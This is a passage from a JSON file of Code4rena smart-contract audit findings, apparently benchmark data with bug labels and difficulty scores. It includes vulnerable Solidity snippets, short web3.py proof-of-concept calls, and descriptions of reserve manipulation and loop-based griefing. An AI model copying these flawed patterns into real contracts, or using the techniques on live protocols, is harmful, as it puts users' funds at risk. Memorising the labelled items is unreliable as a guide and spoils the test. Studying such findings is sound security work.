rate\\nuint128\\nvalidatorSharesRemove\\n=\\ntokensToShares\\n(\\namount\\n,\\nv\\n.\\nexchangeRate\\n);\\nrequire\\n(\\nvalidatorSharesRemove\\n>\\n0\\n,\\n\\\"Unstake amount is too small\\\"\\n);\\nif\\n(\\nv\\n.\\ndisabledEpoch\\n==\\n0\\n) {\\n// @audit rates are updated here\\nupdateGlobalExchangeRate\\n();\\nupdateValidator\\n(\\nv\\n);\\n// ...\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Demonstrating that users will lose rewards:\",\n      \"Assume someone staked 1000 amount and received 1000 shares, and v.exchangeRate = 1.0. (This user is the single staker)\",\n      \"Several epochs pass, interest accrues, and 1000 tokens accrue for the validator, tokensGivenToValidator = 1000. User should be entitled to 1000 in principal + 1000 in rewards = 2000 tokens.\",\n      \"But user calls unstake(1000), which sets validatorSharesRemove = tokensToShares(amount, v.exchangeRate) = 1000 / 1.0 = 1000. Afterwards, the exchange rate is updated: v.exchangeRate += tokensGivenToValidator / totalShares = 1.0 + 1.0 = 2.0. The staker is updated with s.shares -= validatorSharesRemove = 0 and s.staked -= amount = 0. And the user receives their 1000 tokens but notice how the user‚Äôs shares are now at zero as well.\",\n      \"User tries to claim rewards calling redeemAllRewards which fails as the rewards are 0.\"\n    ],\n    \"recommended_mitigation\": [\n      \"The exchange rates always need to be updated first before doing anything. Move the updateGlobalExchangeRate() and updateValidator(v) calls to the beginning of the function.\"\n    ]\n  },\n  {\n    \"row_number\": 78,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Wrong calculation of erc20Delta and ethDelta\\\"\",\n    \"line\": \"Swap[200]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-tally#h-02-wrong-calculation-of-erc20delta-and-ethdelta\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug, also found by harleythedog\",\n      \"Swap.solL200-L225\",\n      \"When a user tries to swap unwrapped ETH to ERC20, even if there is a certain amount of ETH refunded, at L215,ethDeltawill always be0.\",\n      \"That‚Äôs becauseoriginalETHBalancealready includes themsg.valuesent by the caller.\",\n      \"Let‚Äôs say the ETH balance of the contract is1 ETHbefore the swap.\",\n      \"A user swaps10 ETHto USDC;\",\n      \"originalETHBalancewill be11 ETH;\",\n      \"If there is1 ETHof refund;\",\n      \"ethDeltawill be0as the new balance is2 ETHandsubOrZero(2, 11)is0.\",\n      \"Similarly,erc20Deltais also computed wrong.\",\n      \"Consider a special case of a user trying to arbitrage fromWBTCtoWBTC, theoriginalERC20Balancealready includes the input amount,erc20Deltawill always be much lower than the actual delta amount.\",\n      \"For example, for an arb swap from1 WBTCto1.1 WBTC, theethDeltawill be0.1 WBTCwhile it should be1.1 WBTC.\",\n      \"User can not get ETH refund for swaps from ETH to ERC20 tokens;\",\n      \"Arb swap with the same input and output token will suffer the loss of almost all of their input amount unexpectedly.\",\n      \"Consider subtracting the input amount from the originalBalance.\",\n      \"Shadowfiend (Tally) confirmed:\",\n      \"0xean (judge) commented:\"\n    ],\n    \"code_blocks\": [\n      \"function\\nfillZrxQuote\\n(\\nIERC20\\nzrxBuyTokenAddress\\n,\\naddress\\npayable\\nzrxTo\\n,\\nbytes\\ncalldata\\nzrxData\\n,\\nuint256\\nethAmount\\n)\\ninternal\\nreturns\\n(\\nuint256\\n,\\nuint256\\n) {\\nuint256\\noriginalERC20Balance\\n=\\n0\\n;\\nif\\n(!\\nsignifiesETHOrZero\\n(\\naddress\\n(\\nzrxBuyTokenAddress\\n))) {\\noriginalERC20Balance\\n=\\nzrxBuyTokenAddress\\n.\\nbalanceOf\\n(\\naddress\\n(\\nthis\\n));\\n}\\nuint256\\noriginalETHBalance\\n=\\naddress\\n(\\nthis\\n).\\nbalance\\n;\\n(\\nbool\\nsuccess\\n,) =\\nzrxTo\\n.\\ncall\\n{value:\\nethAmount\\n}(\\nzrxData\\n);\\nrequire\\n(\\nsuccess\\n,\\n\\\"Swap::fillZrxQuote: Failed to fill quote\\\"\\n);\\nuint256\\nethDelta\\n=\\naddress\\n(\\nthis\\n).\\nbalance\\n.\\nsubOrZero\\n(\\noriginalETHBalance\\n);\\nuint256\\nerc20Delta\\n;\\nif\\n(!\\nsignifiesETHOrZero\\n(\\naddress\\n(\\nzrxBuyTokenAddress\\n))) {\\nerc20Delta\\n=\\nzrxBuyTokenAddress\\n.\\nbalanceOf\\n(\\naddress\\n(\\nthis\\n)).\\nsubOrZero\\n(\\noriginalERC20Balance\\n);\\nrequire\\n(\\nerc20Delta\\n>\\n0\\n,\\n\\\"Swap::fillZrxQuote: Didn't receive bought token\\\"\\n);\\n}\\nelse\\n{\\nrequire\\n(\\nethDelta\\n>\\n0\\n,\\n\\\"Swap::fillZrxQuote: Didn't receive bought ETH\\\"\\n);\\n}\\nreturn\\n(\\nerc20Delta\\n,\\nethDelta\\n);\\n}\"\n    ],\n    \"quotes\": [\n      \"This doesn‚Äôt allow explicit stealing by an attacker, but does leak value. We would suggest a (2) severity on this.\",\n      \"This results in a user losing assets that they will never be able to recover. Per documentation3 ‚Äî High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).Lost assets are a high sev.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Consider subtracting the input amount from the originalBalance.\"\n    ]\n  },\n  {\n    \"row_number\": 79,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"borrow must accrueInterest first\\\"\",\n    \"line\": \"UToken[396,403,545,556]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-union#h-01-borrow-must-accrueinterest-first\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheUToken.borrowfunction first checks the borrowed balance and the old credit limitbeforeaccruing the actual interest on the market:\",\n      \"Thus the borrowed balance of the user does not include the latest interest as it uses the old globalborrowIndexbut the newborrowIndexis only set inaccrueInterest.\",\n      \"In low-activity markets, it could be that theborrowIndexaccruals (accrueInterestcalls) happen infrequently and a long time is between them.\\nA borrower could borrow tokens, and borrow more tokens later at a different time without first having their latest debt accrued.\\nThis will lead to borrowers being able to borrow more thanmaxBorrowandmore than their credit limitas these checks are performed before updating accruing interest.\"\n    ],\n    \"code_blocks\": [\n      \"// @audit this uses the old value\\nrequire\\n(\\nborrowBalanceView\\n(\\nmsg\\n.\\nsender\\n) +\\namount\\n+\\nfee\\n<=\\nmaxBorrow\\n,\\n\\\"UToken: amount large than borrow size max\\\"\\n);\\nrequire\\n(\\n// @audit this calls uToken.calculateInterest(account) which returns old value\\nuint256\\n(\\n_getCreditLimit\\n(\\nmsg\\n.\\nsender\\n)) >=\\namount\\n+\\nfee\\n,\\n\\\"UToken: The loan amount plus fee is greater than credit limit\\\"\\n);\\n// @audit accrual only happens here\\nrequire\\n(\\naccrueInterest\\n(),\\n\\\"UToken: accrue interest failed\\\"\\n);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Therequire(accrueInterest(), \\\"UToken: accrue interest failed\\\");call should happen at the beginning of the function.\",\n      \"GeraldHost (Union Finance) confirmed\",\n      \"GalloDaSballo (judge) commented:\",\n      \"Agree with the finding, this fundamentally breaks the accounting of the protocolIn protocols that calculate interest, and that have to recalculate state after something changed, it is vital that you accrue all changes up to this point before proceeding with any other state-changing logic\"\n    ]\n  },\n  {\n    \"row_number\": 80,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong implementation of CreditLimitByMedian.sol#getLockedAmount() makes it unable to unlock lockedAmount in CreditLimitByMedian model\\\"\",\n    \"line\": \"CreditLimitByMedian[27]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-union#h-02-wrong-implementation-of-creditlimitbymediansolgetlockedamount-makes-it-unable-to-unlock-lockedamount-in-creditlimitbymedian-model\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"CreditLimitByMedian.solL27-L78\",\n      \"getLockedAmount()is used byUserManager.sol#updateLockedData()to update locked amounts.\",\n      \"Based on the context, at L66,newLockedAmount = array[i].lockedAmount - 1;should benewLockedAmount = array[i].lockedAmount - amount;.\",\n      \"The current implementation is wrong and makes it impossible to unlocklockedAmountinCreditLimitByMedianmodel.\",\n      \"Change to:\",\n      \"newLockedAmount = array[i].lockedAmount - amount;\",\n      \"kingjacob (Union) acknowledged\",\n      \"GalloDaSballo (judge) commented:\"\n    ],\n    \"code_blocks\": [\n      \"function\\ngetLockedAmount\\n(\\nLockedInfo\\n[]\\nmemory\\narray\\n,\\naddress\\naccount\\n,\\nuint256\\namount\\n,\\nbool\\nisIncrease\\n)\\npublic\\npure\\noverride\\nreturns\\n(\\nuint256\\n) {\\nif\\n(\\narray\\n.\\nlength\\n==\\n0\\n)\\nreturn\\n0\\n;\\nuint256\\nnewLockedAmount\\n;\\nif\\n(\\nisIncrease\\n) {\\n...\\n}\\nelse\\n{\\nfor\\n(\\nuint256\\ni\\n=\\n0\\n;\\ni\\n<\\narray\\n.\\nlength\\n;\\ni\\n++) {\\nif\\n(\\narray\\n[\\ni\\n].\\nlockedAmount\\n>\\namount\\n) {\\nnewLockedAmount\\n=\\narray\\n[\\ni\\n].\\nlockedAmount\\n-\\n1\\n;\\n}\\nelse\\n{\\nnewLockedAmount\\n=\\n0\\n;\\n}\\nif\\n(\\naccount\\n==\\narray\\n[\\ni\\n].\\nstaker\\n) {\\nreturn\\nnewLockedAmount\\n;\\n}\\n}\\n}\\nreturn\\n0\\n;\\n}\"\n    ],\n    \"quotes\": [\n      \"The warden identified a mistake in the accounting that would make it impossible to unlock funds, mitigation seems to be straightfoward\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Change to:newLockedAmount = array[i].lockedAmount - amount;\"\n    ]\n  },\n  {\n    \"row_number\": 81,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 5,\n    \"bug_description\": \" \\\"Approved spender can spend too many tokens\\\"\",\n    \"line\": \"WrappedIbbtc[68,91,98], WrappedIbbtcEth[104,111]\",\n    \"url\": \" https://code4rena.com/reports/2021-10-badgerdao#h-02-approved-spender-can-spend-too-many-tokens\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by WatchPug, jonah1005, gzeon, and TomFrenchTheapprovefunction has not been overridden and therefore uses the internalshares, whereastransfer(From)uses the rebalanced amount.\",\n      \"The approved spender may spend more tokens than desired. In fact, the approved amount that can be transferred keeps growing withpricePerShare.\",\n      \"Many contracts also use the same amount for theapprovecall as for the amount they want to have transferred in a subsequenttransferFromcall, and in this case, they approve an amount that is too large (as the approvedsharesamount yields a higher rebalanced amount).\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"The_allowancesfield should track the rebalanced amounts such that the approval value does not grow. (This does not actually require overriding theapprovefunction.)\\nIntransferFrom, the approvals should then be subtracted by thetransferredamount, not theamountInShares:\",\n      \"// _allowances are in rebalanced amounts such that they don't grow\\n// need to subtract the transferred amount\\n_approve\\n(\\nsender\\n,\\n_msgSender\\n(),\\n_allowances\\n[\\nsender\\n][\\n_msgSender\\n()].\\nsub\\n(\\namount\\n,\\n\\\"ERC20: transfer amount exceeds allowance\\\"\\n));\",\n      \"tabshaikh (Badger) confirmed and resolved:\",\n      \"Fix here:https://github.com/Badger-Finance/rebasing-ibbtc/pull/7\"\n    ]\n  },\n  {\n    \"row_number\": 82,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"OverlayV1UniswapV3Market computes wrong market liquidity\\\"\",\n    \"line\": \"OverlayV1UniswapV3Market[50,90,109,119]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-overlay#h-01-overlayv1uniswapv3market-computes-wrong-market-liquidity\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheOverlayV1UniswapV3Market.fetchPricePointtries to compute the market depth in OVL terms asmarketLiquidity (in ETH) / ovlPrice (in ETH per OVL).\\nTo get the market liquidityin ETH(and not the other token pair), it uses theethIs0boolean.\",\n      \"However,ethIs0boolean refers to theovlFeed, whereas the_liquidityrefers to themarketFeed, and therefore theethIs0boolean has nothing to do with themarketfeed where the liquidity is taken from:\",\n      \"If theovlFeedandmarketFeeddo not have the same token position for the ETH pair (ETH is either token 0 or token 1 forbothpairs), then the market liquidity & depth is computed wrong (inverted).\\nFor example, theOverlayV1Market.depth()function will return a wrong depth which is used in the market cap computation.\"\n    ],\n    \"code_blocks\": [\n      \"_marketLiquidity\\n=\\nethIs0\\n? (\\nuint256\\n(\\n_liquidity\\n) <<\\n96\\n) /\\n_sqrtPrice\\n:\\nFullMath\\n.\\nmulDiv\\n(\\nuint256\\n(\\n_liquidity\\n),\\n_sqrtPrice\\n,\\nX96\\n);\",\n      \"// in constructor, if token0 is eth refers to ovlFeed\\nethIs0\\n=\\nIUniswapV3Pool\\n(\\n_ovlFeed\\n).\\ntoken0\\n() ==\\n_eth\\n;\\n// in fetchPricePoint, _liquidity comes from different market feed\\n(\\n_ticks\\n,\\n_liqs\\n) =\\nIUniswapV3Pool\\n(\\nmarketFeed\\n).\\nobserve\\n(\\n_secondsAgo\\n);\\n_marketLiquidity\\n=\\nethIs0\\n? (\\nuint256\\n(\\n_liquidity\\n) <<\\n96\\n) /\\n_sqrtPrice\\n:\\nFullMath\\n.\\nmulDiv\\n(\\nuint256\\n(\\n_liquidity\\n),\\n_sqrtPrice\\n,\\nX96\\n);\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"It seems thatmarketFeed.token0() == WETHshould be used infetchPricePointto compute the liquidity instead ofovlFeed.token0() == WETH.\",\n      \"realisation (Overlay) confirmed:\",\n      \"Yeah, was aware of this, just hadn‚Äôt finalized it in the code as of yet.\"\n    ]\n  },\n  {\n    \"row_number\": 83,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Can not update target price\\\"\",\n    \"line\": \"SwapUtils[1571]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-bootfinance#h-02-can-not-update-target-price\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by jonah1005, also found by WatchPug\",\n      \"The sanity checks inrampTargetPriceare brokenSwapUtils.sol#L1571-L1581\",\n      \"IffutureTargetPricePreciseis smaller thaninitialTargetPricePrecise0.01 offutureTargetPricePrecisewould never larger thaninitialTargetPricePrecise.\",\n      \"Admin would not be able to ramp the target price. As it‚Äôs one of the most important features of the customswap, I consider this is a high-risk issue\",\n      \"None\"\n    ],\n    \"code_blocks\": [\n      \"if\\n(\\nfutureTargetPricePrecise\\n<\\ninitialTargetPricePrecise\\n) {\\nrequire\\n(\\nfutureTargetPricePrecise\\n.\\nmul\\n(\\nMAX_RELATIVE_PRICE_CHANGE\\n).\\ndiv\\n(\\nWEI_UNIT\\n) >=\\ninitialTargetPricePrecise\\n,\\n\\\"futureTargetPrice_ is too small\\\"\\n);\\n}\\nelse\\n{\\nrequire\\n(\\nfutureTargetPricePrecise\\n<=\\ninitialTargetPricePrecise\\n.\\nmul\\n(\\nMAX_RELATIVE_PRICE_CHANGE\\n).\\ndiv\\n(\\nWEI_UNIT\\n),\\n\\\"futureTargetPrice_ is too large\\\"\\n);\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"Here‚Äôs a web3.py script to demo that it‚Äôs not possible to change the target price even by 1 wei.\",\n      \"p1, p2, _, _ =swap.functions.targetPriceStorage().call()\\nfuture = w3.eth.getBlock(w3.eth.block_number)[\\n'timestamp'\\n] +\\n200\\n*\\n24\\n*\\n3600\\n# futureTargetPrice_ is too small\\nswap.functions.rampTargetPrice(p1 -\\n1\\n, future).transact()\\n# futureTargetPrice_ is too large\\nswap.functions.rampTargetPrice(p1 +\\n1\\n, future).transact()\"\n    ],\n    \"recommended_mitigation\": [\n      \"Would it be something like:\",\n      \"if\\n(\\nfutureTargetPricePrecise\\n<\\ninitialTargetPricePrecise\\n) {\\nrequire\\n(\\nfutureTargetPricePrecise\\n.\\nmul\\n(\\nMAX_RELATIVE_PRICE_CHANGE\\n+\\nWEI_UNIT\\n).\\ndiv\\n(\\nWEI_UNIT\\n) >=\\ninitialTargetPricePrecise\\n,\\n\\\"futureTargetPrice_ is too small\\\"\\n);\\n}\\nelse\\n{\\nrequire\\n(\\nfutureTargetPricePrecise\\n<=\\ninitialTargetPricePrecise\\n.\\nmul\\n(\\nMAX_RELATIVE_PRICE_CHANGE\\n+\\nWEI_UNIT\\n).\\ndiv\\n(\\nWEI_UNIT\\n),\\n\\\"futureTargetPrice_ is too large\\\"\\n);\\n}\",\n      \"I believe the dev would spot this mistake if there‚Äôs a more relaxed timeline.\",\n      \"chickenpie347 (Boot Finance) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 84,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"SwapUtils.sol Wrong implementation\\\"\",\n    \"line\": \"SwapUtils[661]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-bootfinance#h-03-swaputilssol-wrong-implementation\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by WatchPug\",\n      \"Based on the context, thetokenPrecisionMultipliersused in price calculation should be calculated in realtime based oninitialTargetPrice,futureTargetPrice,futureTargetPriceTimeand current time, just likegetA()andgetA2().\",\n      \"However, in the current implementation,tokenPrecisionMultipliersused in price calculation is the stored value, it will only be changed when the owner calledrampTargetPrice()andstopRampTargetPrice().\",\n      \"As a result, thetargetPriceset by the owner will not be effective until anothertargetPriceis being set orstopRampTargetPrice()is called.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Consider addingSwap.targetPriceand changing the_xp()at L661 from:\",\n      \"https://github.com/code-423n4/2021-11-bootfinance/blob/f102ee73eb320532c5a7c1e833f225c479577e39/customswap/contracts/SwapUtils.sol#L661-L667\",\n      \"function\\n_xp\\n(\\nSwap\\nstorage\\nself\\n,\\nuint256\\n[]\\nmemory\\nbalances\\n)\\ninternal\\nview\\nreturns\\n(\\nuint256\\n[]\\nmemory\\n)\\n{\\nreturn\\n_xp\\n(\\nbalances\\n,\\nself\\n.\\ntokenPrecisionMultipliers\\n);\\n}\",\n      \"To:\",\n      \"function\\n_xp\\n(\\nSwap\\nstorage\\nself\\n,\\nuint256\\n[]\\nmemory\\nbalances\\n)\\ninternal\\nview\\nreturns\\n(\\nuint256\\n[]\\nmemory\\n)\\n{\\nuint256\\n[\\n2\\n]\\nmemory\\ntokenPrecisionMultipliers\\n=\\nself\\n.\\ntokenPrecisionMultipliers\\n;\\ntokenPrecisionMultipliers\\n[\\n0\\n] =\\nself\\n.\\ntargetPrice\\n.\\noriginalPrecisionMultipliers\\n[\\n0\\n].\\nmul\\n(\\n_getTargetPricePrecise\\n(\\nself\\n)).\\ndiv\\n(\\nWEI_UNIT\\n)\\nreturn\\n_xp\\n(\\nbalances\\n,\\ntokenPrecisionMultipliers\\n);\\n}\",\n      \"chickenpie347 (Boot Finance) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 85,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Swaps are not split when trade crosses target price\\\"\",\n    \"line\": \"SwapUtils[735,765,914,1098]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-bootfinance#h-04-swaps-are-not-split-when-trade-crosses-target-price\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by gzeon\",\n      \"The protocol uses two amplifier values A1 and A2 for the swap, depending on the target price, seeSwapUtils.determineA.\\nThe swap curve is therefore a join of two different curves at the target price.\\nWhen doing a trade that crosses the target price, it should first perform the trade partially with A1 up to the target price, and then the rest of the trade order with A2.\",\n      \"However, theSwapUtils.swap / _calculateSwapfunction does not do this, it only uses the ‚Äúnew A‚Äù, seegetYCstep 5.\",\n      \"Trades that cross the target price and would lead to a new amplifier being used are not split up and use the new amplifier for theentire trade.\\nThis can lead to a worse (better) average execution price than manually splitting the trade into two transactions, first up to but below the target price, and a second one with the rest of the trader order size, using both A1 and A2 values.\",\n      \"In the worst case, it could even be possible to make the entire trade with one amplifier and then sell the swap result again using the other amplifier making a profit.\"\n    ],\n    \"code_blocks\": [\n      \"// 5. Check if we switched A's during the swap\\nif\\n(\\naNew\\n==\\na\\n){\\n// We have used the correct A\\nreturn\\ny\\n;\\n}\\nelse\\n{\\n// We have switched A's, do it again with the new A\\nreturn\\ngetY\\n(\\nself\\n,\\ntokenIndexFrom\\n,\\ntokenIndexTo\\n,\\nx\\n,\\nxp\\n,\\naNew\\n,\\nd\\n);\\n}\"\n    ],\n    \"quotes\": null,\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": [\n      \"Trades that lead to a change in amplifier value need to be split up into two trades using both amplifiers to correctly calculate the swap result.\",\n      \"chickenpie347 (Boot Finance) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 86,\n    \"bug_id\": \" H-06\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Ideal balance is not calculated correctly when providing imbalanced liquidity\\\"\",\n    \"line\": \"SwapUtils[1227]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-bootfinance#h-06-ideal-balance-is-not-calculated-correctly-when-providing-imbalanced-liquidity\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by jonah1005\",\n      \"When a user provides imbalanced liquidity, the fee is calculated according to the ideal balance. In saddle finance, the optimal balance should be the same ratio as in the Pool.\",\n      \"Take, for example, if there‚Äôs 10000 USD and 10000 DAI in the saddle‚Äôs USD/DAI pool, the user should get the optimal lp if he provides lp with ratio = 1.\",\n      \"However, if thecustomSwappool is created with a target price = 2. The user would get 2 times more lp if he deposits DAI.SwapUtils.sol#L1227-L1245The current implementation does not calculates ideal balance correctly.\",\n      \"If the target price is set to be 10, the ideal balance deviates by 10.\\nThe fee deviates a lot. I consider this is a high-risk issues.\",\n      \"None\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"We can observe the issue if we initiates two pools DAI/LINK pool and set the target price to be 4.\",\n      \"For the first pool, we deposit more DAI.\",\n      \"swap = deploy_contract(\\n'Swap'\\n[dai.address, link.address], [\\n18\\n,\\n18\\n],\\n'lp'\\n,\\n'lp'\\n,\\n1\\n,\\n85\\n,\\n10\\n**\\n7\\n,\\n0\\n,\\n0\\n,\\n4\\n*\\n10\\n**\\n18\\n)\\nlink.functions.approve(swap.address, deposit_amount).transact()\\ndai.functions.approve(swap.address, deposit_amount).transact()\\nprevious_lp = lptoken.functions.balanceOf(user).call()\\nswap.functions.addLiquidity([deposit_amount, deposit_amount //\\n10\\n],\\n10\\n,\\n10\\n**\\n18\\n).transact()\\npost_lp = lptoken.functions.balanceOf(user).call()\\nprint\\n(\\n'get lp'\\n, post_lp - previous_lp)\",\n      \"For the second pool, one we deposit more DAI.\",\n      \"swap = deploy_contract(\\n'Swap'\\n[dai.address, link.address], [\\n18\\n,\\n18\\n],\\n'lp'\\n,\\n'lp'\\n,\\n1\\n,\\n85\\n,\\n10\\n**\\n7\\n,\\n0\\n,\\n0\\n,\\n4\\n*\\n10\\n**\\n18\\n)\\nlink.functions.approve(swap.address, deposit_amount).transact()\\ndai.functions.approve(swap.address, deposit_amount).transact()\\nprevious_lp = lptoken.functions.balanceOf(user).call()\\nswap.functions.addLiquidity([deposit_amount, deposit_amount //\\n10\\n],\\n10\\n,\\n10\\n**\\n18\\n).transact()\\npost_lp = lptoken.functions.balanceOf(user).call()\\nprint\\n(\\n'get lp'\\n, post_lp - previous_lp)\",\n      \"We can get roughly 4x more lp in the first case\"\n    ],\n    \"recommended_mitigation\": [\n      \"The current implementation usesself.balances\",\n      \"https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/SwapUtils.sol#L1231-L1236\",\n      \"for\\n(\\nuint256\\ni\\n=\\n0\\n;\\ni\\n<\\nself\\n.\\npooledTokens\\n.\\nlength\\n;\\ni\\n++) {\\nuint256\\nidealBalance\\n=\\nv\\n.\\nd1\\n.\\nmul\\n(\\nself\\n.\\nbalances\\n[\\ni\\n]).\\ndiv\\n(\\nv\\n.\\nd0\\n);\\nfees\\n[\\ni\\n] =\\nfeePerToken\\n.\\nmul\\n(\\nidealBalance\\n.\\ndifference\\n(\\nnewBalances\\n[\\ni\\n]))\\n.\\ndiv\\n(\\nFEE_DENOMINATOR\\n);\\nself\\n.\\nbalances\\n[\\ni\\n] =\\nnewBalances\\n[\\ni\\n].\\nsub\\n(\\nfees\\n[\\ni\\n].\\nmul\\n(\\nself\\n.\\nadminFee\\n).\\ndiv\\n(\\nFEE_DENOMINATOR\\n)\\n);\\nnewBalances\\n[\\ni\\n] =\\nnewBalances\\n[\\ni\\n].\\nsub\\n(\\nfees\\n[\\ni\\n]);\\n}\",\n      \"Replacesself.balanceswith_xp(self, newBalances)would be a simple fix.\\nI consider the team can take balance‚Äôs weighted pool as a reference.WeightedMath.sol#L149-L179\",\n      \"chickenpie347 (Boot Finance) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 87,\n    \"bug_id\": \" H-08\",\n    \"bug_label\": \" S2-1\",\n    \"difficulty\": 4,\n    \"bug_description\": \" \\\"Unable to claim vesting due to unbounded timelock loop\\\"\",\n    \"line\": \"Vesting[81,148,195]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-bootfinance#h-08-unable-to-claim-vesting-due-to-unbounded-timelock-loop\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by nathaniel, also found by WatchPug, leastwood, and pauliax\",\n      \"The timelocks for anybeneficiaryare unbounded, and can be vested by someone who is not thebeneficiary. When the array becomes significantly big enough, the vestments will no longer be claimable for thebeneficiary.\",\n      \"Thevest()function in Vesting.sol does not check thebeneficiary, hence anyone can vest for anyone else, pushing a new timelock to thetimelocks[_beneficiary].\\nThe_claimableAmount()function (used byclaim()function), then loops through thetimelocks[_beneficiary]to determine the amount to be claimed.\\nA malicious actor can easy repeatedly call thevest()function with minute amounts to make the array large enough, such that when it comes to claiming, it will exceed the gas limit and revert, rendering the vestment for the beneficiary unclaimable.\\nThe malicious actor could do this to eachbeneficiary, locking up all the vestments.\",\n      \"Manual code review\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L81https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L195https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L148\"\n    ],\n    \"recommended_mitigation\": [\n      \"Create a minimum on the vestment amounts, such that it won‚Äôt be feasible for a malicious actor to create a large amount of vestments.Restrict the vestment contribution of abeneficiarywhererequire(beneficiary == msg.sender)\",\n      \"chickenpie347 (Boot Finance) confirmed\"\n    ]\n  },\n  {\n    \"row_number\": 88,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S1-2\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Minting and burning synths exposes users to unlimited slippage\\\"\",\n    \"line\": \"VaderPoolV2[126]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-01-minting-and-burning-synths-exposes-users-to-unlimited-slippage\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by TomFrenchBlockchain, also found by cmichel\",\n      \"The amount of synths minted / assets received when minting or burning synths can be manipulated to an unlimited extent by manipulating the reserves of the pool\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": null,\n    \"proof_of_concept\": [\n      \"SeeVaderPool.mintSynth:https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/dex-v2/pool/VaderPoolV2.sol#L126-L167\",\n      \"Here a user sendsnativeDepositto the pool and the equivalent amount offoreignAssetis minted as a synth to be sent to the user. However the user can‚Äôt specify the minimum amount of synth that they would accept. A frontrunner can then manipulate the reserves of the pool in order to makeforeignAssetappear more valuable than it really is so the user receives synths which are worth much less than whatnativeDepositis worth. This is equivalent to a swap without a slippage limit.\",\n      \"Burning synths essentially runs the same process in behalf so manipulating the pool in the opposite direction will result in the user getting fewer ofnativeAssetthan they expect.\"\n    ],\n    \"recommended_mitigation\": [\n      \"Add a argument for the minimum amount of synths to mint or nativeAsset to receive.\",\n      \"SamSteinGG (Vader) acknowledged and disagreed with severity:\",\n      \"We believe the severity should be set to medium as there are no loss of funds and its exploit requires special circumstances to be profitable.\"\n    ]\n  },\n  {\n    \"row_number\": 89,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Redemption value of synths can be manipulated to drain VaderPool of all native assets\\\"\",\n    \"line\": \"VaderPoolV2[126]\",\n    \"url\": \" https://code4rena.com/reports/2021-11-vader#h-02-redemption-value-of-synths-can-be-manipulated-to-drain-vaderpool-of-all-native-assets\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 